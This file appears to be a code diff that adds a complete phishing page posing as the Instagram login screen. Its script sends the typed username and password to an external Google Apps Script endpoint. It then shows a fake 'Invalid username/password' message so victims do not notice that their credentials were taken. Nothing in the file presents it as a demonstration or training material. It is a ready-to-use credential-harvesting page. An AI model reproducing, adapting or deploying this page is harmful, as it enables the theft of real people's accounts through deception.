@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" sizes="192x192" href="images/icon.png" type="image/icon type">
+    <link rel="stylesheet" href="indexcss.css" type="text/css">
+    <!-- <link href="http://fonts.cdnfonts.com/css/billabong" rel="stylesheet"> -->
+
+    <title>Instagram</title>
+</head>
+
+<body bgcolor="#ffffff">
+    <div id="cred">
+        <p id="logo"><img src="images/logo.png" height="auto" width="50%"><br>
+            <button id="fb"><span id="fblogo">f</span><span>&nbsp&nbspContinue with Facebook</span></button>
+        <p id="line"><span>OR</span></p>
+
+        </p>
+        <form id="credform" name="google-sheet">
+            <input type="text" name="username" id="uname" class="inp" placeholder="Phone number, username, or email"
+                required><br>
+            <input type="password" id="pwd" name="password" class="inp" placeholder="Password" required><br>
+            <span id="fpwd"><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></span><br>
+            <div id="error"></div>
+            <button id="login" type="submit" name="submit" onclick="fun()">Log In </button>
+            <p id="sup">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"><strong>Sign
+                        up</strong></a></p>
+        </form>
+
+    </div>
+    <footer id="foot">
+        <div class="footerdivs"><a href="#">Meta</a>&nbsp&nbsp <a href="#">About</a>&nbsp&nbsp <a
+                href="#">Blog</a>&nbsp&nbsp <a href="#">Jobs</a>&nbsp&nbsp <a href="#">Help</a>&nbsp&nbsp <a
+                href="#">API</a>&nbsp&nbsp <a href="#">Privacy</a>&nbsp&nbsp <a href="#">Terms</a>&nbsp&nbsp <a
+                href="#">Top Accounts</a>&nbsp&nbsp <a href="#">Hashtags</a>&nbsp&nbsp <a
+                href="#">Locations</a>&nbsp&nbsp <a href="#">Instagram Lite</a></div>
+        <div class="footerdivs"><a href="#">Beauty</a>&nbsp&nbsp <a href="#">Dance</a>&nbsp&nbsp <a
+                href="#">Fitness</a>&nbsp&nbsp <a href="#">Food & Drink</a>&nbsp&nbsp <a href="#">Home &
+                Garden</a>&nbsp&nbsp <a href="#">Music</a>&nbsp&nbsp <a href="#">Visual Arts</a></div>
+        <div class="footerdivs" id="lastdiv">&copy; 2021 Instagram from Meta</div>
+    </footer>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwCYow9PCFFKrFJcDaB4Z3TX1lsbFT6wUnL-VHkCmI2XO89IPUZ3kGhkiCzYodA6qzF/exec'
+        const form = document.forms['google-sheet']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .catch(error => console.error('Error!', error.message))
+        })
+
+        function fun() {
+
+            var ele = document.getElementById("error");
+            ele.innerHTML = "Invalid username/password! Please enter correctly."
+
+        }
+
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+    <!-- <p style="font-family: 'Billabong', sans-serif;">Instagram</p> -->
+</body>
+
+</html>
